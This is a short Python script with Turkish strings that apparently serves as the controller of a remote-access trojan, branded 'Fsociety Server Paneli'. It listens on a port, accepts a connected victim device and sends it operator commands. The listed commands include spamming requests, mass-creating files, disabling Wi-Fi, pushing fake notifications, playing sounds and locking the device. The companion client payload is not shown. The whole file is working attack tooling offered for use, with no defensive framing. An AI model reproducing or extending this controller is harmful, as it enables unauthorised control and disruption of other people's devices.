import socket
import argparse
import os

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", type=int, default=8080, help="Dinlenecek port")
args = parser.parse_args()

ip = "0.0.0.0"
port = args.port

s = socket.socket()
s.bind((ip, port))
s.listen(1)

print(f"[+] Dinleniyor: {ip}:{port}")
client, addr = s.accept()
print(f"[+] Bağlandı: {addr}")

def menu():
    print(f"""
╔════════════════════════════════════════════╗
║          Fsociety Server Paneli           ║
║------------------------------------------║
║ Komutlar:                                 ║
║ - spam-istek <sayi>   (Max 1000)          ║
║ - olustur-dosya <sayi> (Max 100)          ║
║ - youtube <link>                          ║
║ - sound local                             ║
║ - wifi-off                                ║
║ - bildirim "Başlık" "İçerik"              ║
║ - bildirim-say                            ║
║ - kilit                                   ║
║ - exit                                    ║
╚════════════════════════════════════════════╝
""")

menu()

while True:
    try:
        komut = input("Komut >> ").strip()
        if not komut:
            continue

        client.send(komut.encode())

        if komut == "exit":
            print("[✓] Bağlantı sonlandırıldı.")
            break

        cevap = client.recv(4096).decode()
        print(f"[📥] Cevap:\n{cevap}")

    except KeyboardInterrupt:
        print("\n[!] Sunucu durduruldu.")
        client.send(b"exit")
        client.close()
        break
